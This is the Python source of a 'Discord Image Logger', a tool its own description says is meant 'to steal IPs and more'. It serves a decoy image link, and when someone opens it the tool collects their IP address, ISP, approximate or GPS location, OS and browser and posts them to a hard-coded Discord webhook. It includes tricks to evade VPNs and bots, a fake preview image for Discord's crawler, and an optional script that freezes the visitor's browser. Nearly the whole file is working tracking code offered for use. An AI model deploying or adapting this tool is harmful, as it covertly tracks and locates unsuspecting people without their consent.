# Discord Image Logger
# By Icepull | 

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser*

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1148565911771549767/yS4PSvZiQUU49mGPirl1_LyNXdPcMvjT0sAwuQT1Yic2yliJSK8ujnFeN13u109qgFfj",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
